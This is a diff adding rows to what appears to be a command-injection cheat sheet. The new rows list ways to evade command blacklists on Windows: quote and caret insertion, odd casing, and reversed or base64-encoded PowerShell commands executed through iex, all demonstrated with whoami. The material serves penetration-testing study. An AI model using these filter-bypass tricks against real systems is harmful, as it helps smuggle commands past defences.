@@ -74,5 +74,32 @@ Injection Operators
 |$env:PROGRAMFILES[10] |	Will be replaced with a space - (PowerShell)|
 
 ### Other Characters 	
+|Code| 	Description|
+|:----|:----|
 |%HOMEPATH:~0,-17% 	|Will be replaced with \ - (CMD)|
 |$env:HOMEPATH[0] |	Will be replaced with \ - (PowerShell)|
+
+### Blacklisted Command Bypass
+
+### Character Insertion 	
+|Code| 	Description|
+|:----|:----|
+|' or " 	|Total must be even|
+|^ 	|Windows only (CMD)|
+
+### Case Manipulation 
+|Code| 	Description|
+|:----|:----|
+|WhoAmi 	|Simply send the character with odd cases|
+
+### Reversed Commands 	
+|Code| 	Description|
+|:----|:----|
+|"whoami"[-1..-20] -join '' |	Reverse a string|
+|iex "$('imaohw'[-1..-20] -join '')" 	|Execute reversed command|
+
+### Encoded Commands 	
+|Code| 	Description|
+|:----|:----|
+|[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))| 	Encode a string with base64|
+|iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" 	|Execute b64 encoded string|
